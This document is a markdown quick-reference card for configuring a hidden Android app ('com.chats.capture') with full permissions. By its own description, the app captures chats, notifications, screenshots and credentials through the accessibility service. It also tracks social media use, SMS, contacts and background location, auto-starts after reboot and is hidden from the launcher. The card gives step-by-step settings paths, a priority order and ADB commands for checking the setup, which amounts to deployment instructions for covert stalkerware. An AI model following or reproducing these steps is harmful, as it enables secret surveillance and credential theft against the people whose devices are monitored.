# Quick Permission Reference Card

## 🚀 Quick Start: Grant All Permissions

### Access the App
1. Open **Settings** app
2. Go to **Apps** → **[App Name]**
3. App settings screen opens automatically

---

## ✅ Permission Checklist (5 Critical Permissions)

### 1. Notification Access ⚠️ CRITICAL
- **Path:** Settings → Apps → Special Access → Notification Access
- **Action:** Toggle **ON** for the app
- **Why:** Captures notifications from all apps

### 2. Accessibility Service ⚠️ CRITICAL  
- **Path:** Settings → Accessibility → Downloaded Apps
- **Action:** Tap app → Toggle **ON** → Confirm
- **Why:** Captures chats, screenshots, credentials

### 3. Usage Access
- **Path:** Settings → Apps → Special Access → Usage Access
- **Action:** Tap app → Toggle **ON**
- **Why:** Detects when social media apps are active

### 4. Battery Optimization
- **Path:** Settings → Apps → Special Access → Battery Optimization
- **Action:** Tap app → Select **"Don't Optimize"**
- **Why:** Keeps services running in background

### 5. Auto-Start (Device-Specific)
- **Samsung:** Settings → Apps → Special Access → Autostart
- **Xiaomi:** Settings → Apps → Manage Apps → Autostart
- **Huawei:** Settings → Apps → Launch
- **OnePlus:** Settings → Apps → Startup Manager
- **Action:** Toggle **ON** for the app
- **Why:** Auto-starts after device reboot

---

## 📱 Using the Settings Screen

The app provides a **single-screen permission hub** with:

- ✅ **Status Indicators:** Green = Enabled, Red = Disabled
- 🔘 **Enable Buttons:** Tap to open the correct Settings page
- 📊 **Real-time Updates:** Status updates when you return

### How to Use:
1. Open Settings → Apps → [App Name]
2. Scroll to **"Permissions"** section
3. Review status of each permission
4. Tap **"Enable"** button for any disabled permission
5. Settings page opens automatically
6. Enable the permission
7. Return to app (status updates automatically)

---

## 🔍 Verify Permissions

### In-App Verification:
- Open Settings → Apps → [App Name]
- Check **"Permissions"** section
- All should show ✅ **Enabled** (green)

### Via ADB:
```bash
# Check notification access
adb shell settings get secure enabled_notification_listeners | grep com.chats.capture

# Check accessibility
adb shell settings get secure enabled_accessibility_services | grep com.chats.capture

# Check all permissions
adb shell dumpsys package com.chats.capture | grep permission
```

### Via Logcat:
```bash
adb logcat -s PermissionChecker:D
```

---

## ⚡ Quick Fixes

### Permission Not Detected?
1. **Disable** the permission in Settings
2. **Re-enable** the permission
3. Return to app

### Settings Page Won't Open?
- Manually navigate using the paths above
- Or use ADB: `adb shell am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS`

### App Not Found in Settings?
- The app is hidden from launcher
- Access via: Settings → Apps → [App Name]
- Or use ADB: `adb shell am start -n com.chats.capture/.ui.MainActivity`

---

## 📋 Complete Permission List

### Runtime Permissions (9)
- ✅ Notifications (Android 13+)
- ✅ Images
- ✅ Videos  
- ✅ Audio
- ✅ Contacts
- ✅ SMS
- ✅ Fine Location
- ✅ Coarse Location
- ✅ Background Location

### Special Permissions (5)
- ✅ Notification Access
- ✅ Accessibility Service
- ✅ Usage Access
- ✅ Battery Optimization
- ✅ Auto-Start

**Total: 14 Permissions**

---

## 🎯 Priority Order

Grant permissions in this order for best results:

1. **Notification Access** (Most Critical)
2. **Accessibility Service** (Most Critical)
3. **Usage Access**
4. **Battery Optimization**
5. **Runtime Permissions** (Auto-requested)
6. **Auto-Start** (Optional but recommended)

---

## 💡 Tips

- **Grant all permissions** for full functionality
- **Return to app** after enabling each permission (app detects automatically)
- **Check status** in Settings screen to verify
- **Use ADB** for quick verification during testing
- **App is hidden** - access via Settings only

---

## 🆘 Troubleshooting

| Issue | Solution |
|-------|----------|
| Permission not detected | Disable → Re-enable in Settings |
| Settings won't open | Navigate manually using paths above |
| App not found | Access via Settings → Apps → [App Name] |
| Battery optimization resets | Some devices require additional confirmation |

---

**For detailed steps, see:** `PERMISSION_GRANT_STEPS.md`
